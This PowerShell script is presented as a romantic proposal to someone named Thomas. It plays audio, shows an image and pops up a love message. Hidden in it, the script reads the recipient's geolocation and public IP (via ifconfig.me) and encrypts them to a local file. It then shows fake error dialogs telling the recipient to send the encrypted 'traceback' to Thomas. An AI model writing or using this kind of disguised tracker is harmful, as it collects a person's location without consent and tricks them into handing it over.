function play_audio {
    param (
        $path
    )

    Add-Type -AssemblyName presentationCore
    $mediaPlayer = New-Object system.windows.media.mediaplayer
    $mediaPlayer.open($path)
    $mediaPlayer.Play()

}

function get_ip {
    return (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
}

function safe_data {
    param (
        $data,
        $path
        
    )

    $PasswordSecureString = ConvertTo-SecureString -String $data -AsPlainText -Force
    $EncryptedData = ConvertFrom-SecureString $PasswordSecureString
    $EncryptedData | Out-File -FilePath $path

    return $EncryptedData

}

function get_location {
Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
    $GeoWatcher.Start() #Begin resolving current locaton

    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
        Start-Sleep -Milliseconds 100 #Wait for discovery.
    }  

    if ($GeoWatcher.Permission -eq 'Denied'){
        $result = 'error'
    } else {
        $result = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
    }

    return $result

}

#make a second secion for the image
$ps = [PowerShell]::Create()
[void]$ps.AddScript({
    Add-Type -AssemblyName System.Windows.Forms

    function open_picture{
    param(
        $picture_path
    )

    $file = (get-item $picture_path)
    $img = [System.Drawing.Image]::Fromfile((get-item $file))

    [System.Windows.Forms.Application]::EnableVisualStyles()
    $form = new-object Windows.Forms.Form
    $form.Text = "Image Viewer"
    $form.Width = $img.Size.Width;
    $form.Height =  $img.Size.Height;
    $pictureBox = new-object Windows.Forms.PictureBox
    $pictureBox.Width =  $img.Size.Width;
    $pictureBox.Height =  $img.Size.Height;

    $pictureBox.Image = $img;
    $form.controls.add($pictureBox)
    $form.Add_Shown( { $form.Activate() } )
    $form.ShowDialog()


}

    $user_name = $env:UserName
    $root = "C:\Users\" + $user_name + "\.proposal_thomas"
    $picture_path = $root + "\images\nagito_proposal_img.jpg"

    open_picture -picture_path $picture_path
})
[void]$ps.BeginInvoke()

sleep 3
#set up
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationFramework

$user_name = $env:UserName
$root = "C:\Users\" + $user_name + "\.proposal_thomas"

play_audio -path ($root + "\audios\nagito_audio.mp3")

sleep 10

#mesage
$love_mesage = 'I am in love with the hope that sleeps inside you ¿serias el hinata de mi nagito?'

[string]$location = get_location
$ip = get_ip
Write-Output ($location + "||" + $ip) 
$encryted = safe_data -data ($location + "||" + $ip) -path $root + "\safety.log"

if ($location -eq 'error') {
    $_ = [System.Windows.MessageBox]::Show("Somthing whent wrong can you speak with thomas send this please: " + $encryted,"Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
}
else {
    
    $_ = [System.Windows.MessageBox]::Show("Somthing is odd can you send this traceback to thomas: "+$encryted,"Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)

    $result = [System.Windows.MessageBox]::Show($love_mesage, 'Love u', 'YesNo','information')
    
}
